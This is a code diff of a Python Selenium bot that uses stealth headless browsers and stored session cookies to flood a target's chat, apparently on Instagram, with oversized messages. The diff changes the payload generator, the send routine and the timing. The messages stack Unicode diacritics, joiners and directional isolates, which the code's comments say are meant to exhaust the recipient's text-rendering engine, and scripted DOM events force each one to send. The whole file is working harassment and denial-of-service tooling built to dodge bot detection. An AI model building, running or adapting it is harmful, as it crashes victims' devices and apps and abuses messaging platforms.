@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (COLLAPSE V70)
-# 📅 STATUS: KERNEL-INTERRUPT-ACTIVE | 4-AGENT TOTAL | AWS-CPU-NUKE
+# 🚀 PROJECT: PRAVEER.OWNS (LOOP-BYPASS V71)
+# 📅 STATUS: ATOMIC-SEND-ACTIVE | 4-AGENT TOTAL | AWS-CPU-TARGET
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -12,43 +12,31 @@ from selenium.webdriver.chrome.options import Options
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.01, 0.05)  # 🔥 MAXIMUM PACKET VELOCITY
-REST_AFTER_STRIKES = 300   
-REST_DURATION = 2          
+BURST_SPEED = (0.3, 0.8)    # 🛡️ Slightly slower for guaranteed delivery
+REST_AFTER_STRIKES = 120   
+REST_DURATION = 3          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_architectural_collapse_payload():
-    """Generates a payload that forces 'Grapheme Cluster' recursion."""
+def get_loop_bypass_payload():
+    """Generates a payload that targets the HarfBuzz shaping engine and BiDi stack."""
     u_id = random.randint(100, 999)
-    
-    # \u034F = CGJ (Combining Grapheme Joiner)
-    # \u0300-\u036F = Stacking Diacritics
-    # \u2066-\u2069 = Directional Isolates
-    cgj = "\u034F"
-    marks = "".join([chr(i) for i in range(0x0300, 0x036F)]) # 112 stacked marks
-    lri, rli, pdi = "\u2066", "\u2067", "\u2069"
-    
-    heavy_glyphs = ["𒀱", "﷽", "𒈙", "⠿", "𒈓", "𒈔"]
+    # \u2068 = FSI | \u2069 = PDI | \u034F = CGJ
+    fsi, pdi, cgj = "\u2068", "\u2069", "\u034F"
+    # Overlapping diacritics to exhaust the shaping buffer
+    marks = "".join([chr(i) for i in range(0x0300, 0x0345)]) 
     glue = "\u2060"
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [KERNEL_LOCK:{u_id}]"
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [LOOP_LOCK:{u_id}]"
     
     body = []
-    # 440 lines - Saturating the 10,000 character socket buffer
-    for i in range(440):
-        random.shuffle(heavy_glyphs)
-        # WE NEST ISOLATES INSIDE STACKED MARKS.
-        # This forces the C++ rendering thread to hold thousands of 
-        # 'Floating Point' positions in the CPU cache simultaneously.
-        line = f"{lri}{rli}{lri}"
-        for g in heavy_glyphs:
-            line += f"{g}{marks}{cgj}"
-        line += f"{pdi*3}"
-        
-        body.append(f"PRAVEER PAPA {line} {i}{glue*2}")
+    # 400 lines of mathematically 'Unstable' layout logic
+    for i in range(400):
+        # We alternate directional isolates to force the CPU to re-check the stack
+        line = f"{fsi}P{marks}{cgj}R{marks}{cgj}A{marks}{cgj}V{marks}{cgj}EER{pdi} 🌙 {i}{glue*4}"
+        body.append(line)
         
     return f"{header}\n{glue.join(body)}".strip()[:9998]
 
@@ -58,7 +46,9 @@ def get_driver(agent_id):
         chrome_options.add_argument("--headless=new") 
         chrome_options.add_argument("--no-sandbox") 
         chrome_options.add_argument("--disable-dev-shm-usage")
+        # 🛡️ Keep YOUR bot fast by disabling all rendering
         chrome_options.add_argument("--disable-gpu")
+        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
         chrome_options.binary_location = "/usr/bin/google-chrome"
         
         ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
@@ -68,17 +58,23 @@ def get_driver(agent_id):
         stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
         return driver
 
-def atomic_dispatch_send(driver, text):
-    """Bypasses local UI lag with direct DOM event injection."""
+def atomic_send(driver, text):
+    """Bypasses the UI lag by forcing a direct Socket-level event."""
     try:
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
             if (box) {
                 box.focus();
+                // 1. Clear any stuck state
                 document.execCommand('selectAll', false, null);
                 document.execCommand('delete', false, null);
+                // 2. Direct string injection (Bypasses typing animation)
                 document.execCommand('insertText', false, arguments[0]);
+                
+                // 3. Force sync for Instagram's React Framework
                 box.dispatchEvent(new Event('input', { bubbles: true }));
+                
+                // 4. Force immediate Enter dispatch
                 var e = new KeyboardEvent('keydown', {
                     key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                     bubbles: true, cancelable: true
@@ -100,15 +96,15 @@ def run_life_cycle(agent_id, cookie, target):
             
             strike_count = 0
             while True:
-                payload = get_architectural_collapse_payload()
-                if atomic_dispatch_send(driver, payload):
+                payload = get_loop_bypass_payload()
+                if atomic_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Collapse-Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Atomic-Strike ({GLOBAL_SENT})")
                     
-                    if strike_count % 100 == 0:
+                    if strike_count % 80 == 0:
                         driver.refresh()
                         time.sleep(5)
                 time.sleep(random.uniform(*BURST_SPEED))
